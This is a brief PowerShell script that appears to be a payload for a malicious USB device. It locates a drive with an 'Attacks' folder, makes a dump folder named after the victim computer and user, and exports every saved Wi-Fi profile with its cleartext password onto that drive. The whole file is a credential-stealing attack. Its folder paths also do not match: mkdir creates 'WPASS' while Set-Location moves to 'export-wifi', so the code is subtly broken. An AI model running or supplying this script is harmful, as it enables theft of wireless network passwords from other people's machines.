$USBDrive = get-psdrive |where {$_.Root -match ":"} |% {if (Test-Path ($_.Root + "Attacks")){$_.Root}}
mkdir "$USBDrive\Attacks\WPASS\Dump\$env:COMPUTERNAME-$env:USERNAME"
Set-Location "$USBDrive\Attacks\export-wifi\Dump\$env:COMPUTERNAME-$env:USERNAME"
netsh wlan export profile key=clear